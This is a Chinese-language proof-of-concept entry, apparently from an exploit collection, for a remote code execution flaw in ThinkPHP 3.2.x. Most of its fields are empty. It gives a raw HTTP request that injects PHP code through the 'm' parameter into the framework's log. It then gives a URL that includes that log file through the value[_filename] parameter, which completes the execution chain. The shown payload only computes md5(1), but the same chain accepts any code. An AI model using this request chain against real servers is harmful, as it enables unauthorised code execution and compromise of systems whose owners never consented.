﻿# thinkphp32x_rce

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /index.php?m=--%3E%3C?=md5(1);?%3E HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;
Upgrade-Insecure-Requests: 1
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/

> 验证文件来源：thinkphp32x_rce.poc
